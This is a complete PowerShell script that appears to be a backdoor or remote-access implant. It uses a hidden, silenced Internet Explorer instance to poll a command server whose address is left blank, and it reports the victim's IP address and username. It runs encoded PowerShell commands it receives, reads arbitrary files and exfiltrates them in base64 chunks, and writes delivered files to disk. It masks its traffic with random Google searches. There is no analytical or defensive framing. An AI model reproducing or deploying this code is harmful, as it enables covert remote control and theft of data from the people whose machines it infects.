$CHUNK_SIZE = 35000;
$SIZE_LIMIT = 8500000;
$SRV = '';
$SEARCH_DICTIONARY = @('bitcoin', 'vacation', 'dancing', 'facebook', 'reddit', 'cat', 'dog', 'gif', 'iphone', 'trump', 'youtube', 'amazon', 'skydiving', 'nfl', 'football', 'basketball');

function get {
  param($ie, $k, $d);
  $x = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($d));
  $ie.navigate2($SRV + "?$k=" + $x, 14, 0, $null, $null);
  while ($ie.busy -or ($ie.readystate -ne 4)) {sleep -seconds 1};
  return $ie.document.lastchild.innertext;
}

function post {
  param($ie, $k, $d, $p);
  $x = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($d));
  $ie.navigate2($SRV + "?$k=" + $x, 14, 0, [Text.Encoding]::UTF8.GetBytes("d=$p"), $null);
  while ($ie.busy -or ($ie.readystate -ne 4)) {sleep -seconds 1};
}

function run {
  param($s, $ie);
  $type = get $ie 'TxR' $s;
  if ($type -ne '0') {
    $col = 3;
    $buf = New-Object Collections.ArrayList;
    while (1) {
      $d = get $ie 'TxD' ($s + '|' + $col);
      if ($d -eq $null) {
        break;
      }
      $buf.add($d) | out-null;
      $col++;
    }
    post $ie  'Tx'  ($s + '|2') '0';
    if ($type -eq '@') {
      $xc = $buf -join '';
      $r = powershell.exe -nopr -noni -enc $xc;
      if ($r -eq $null) {
        $r = 'NULL';
      } else {
        $r = $r | out-string;
      }
      $r = $r.ToCharArray();
    } elseif ($type -eq '^') {
      $r = [IO.file]::ReadAllBytes([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($buf -join '')));
      if ($r.length -ge $SIZE_LIMIT) {
        $r = '';
      }
    } else {
      [IO.file]::WriteAllBytes("$type", [Convert]::FromBase64String($buf -join ''));
      $r = 'NULL'.ToCharArray();
    }
    $col = 3;
    $i = 0;
    while ($i -le ($r.length - $CHUNK_SIZE)) {
      $x = [Convert]::ToBase64String($r[$i..($i + $CHUNK_SIZE)]);
      post $ie 'Rx' ($s + '|' + $col) $x;
      $i += $CHUNK_SIZE;
      $col++;
    }
    $x = [Convert]::ToBase64String($r[$i..($r.length - 1)]);
    post $ie 'Rx' ($s + '|' + $col) $x;
    post $ie 'Rx' ($s + '|2') '1';
  }
}

while (1) {
  try {
    $ie = new-object -com internetexplorer.application;
    $ie.visible = $false;
    $ie.silent = $true;
    $ip = get-wmiobject Win32_NetworkAdapterConfiguration | where {$_.Ipaddress.length -gt 1};
    $s = $ip.ipaddress[0] + '|' + $env:USERNAME;
    while (1) {
      run $s $ie;
      $r1 = Get-Random -InputObject $SEARCH_DICTIONARY;
      $r2 = Get-Random -InputObject $SEARCH_DICTIONARY;
      $ie.navigate("https://www.google.com/search?q=$r1+$r2", 14);
      $delay = Get-Random -InputObject 5, 6, 7, 8, 9, 10;
      sleep -seconds $delay;
      $ie.stop();
    }
  } catch {
    taskkill.exe /f /im iexplore.exe;
    write-host $_;
  }
}
